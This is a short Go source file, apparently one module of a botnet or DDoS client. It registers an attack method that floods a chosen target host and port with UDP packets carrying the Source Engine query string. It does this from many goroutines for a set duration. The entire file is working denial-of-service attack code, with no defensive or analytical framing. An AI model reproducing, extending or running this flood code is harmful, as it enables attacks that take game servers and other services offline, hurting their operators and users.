package methodImpl

import (
	"client/core/modules/methods"
	"fmt"
	"net"
	"time"
)

func init() {
	methods.Make(&methods.Method{
		Id: 2,
		Executor: func(targets []string, port int, duration int, flags map[int]interface{}) error {
			start := time.Now()
			addr := fmt.Sprintf("%s:%d", randomChoice(targets), port)

			threads, exists := flags[methods.FlagThreads]
			if !exists {
				threads = 1
			}

			for i := 0; i < threads.(int); i++ {
				go func() {
					for time.Since(start) < time.Duration(duration)*time.Second {
						conn, err := net.Dial("udp", addr)
						if err != nil {
							continue
						}

						conn.Write([]byte("TSource Engine Query"))
					}
				}()
			}
			return nil
		},
	})
}
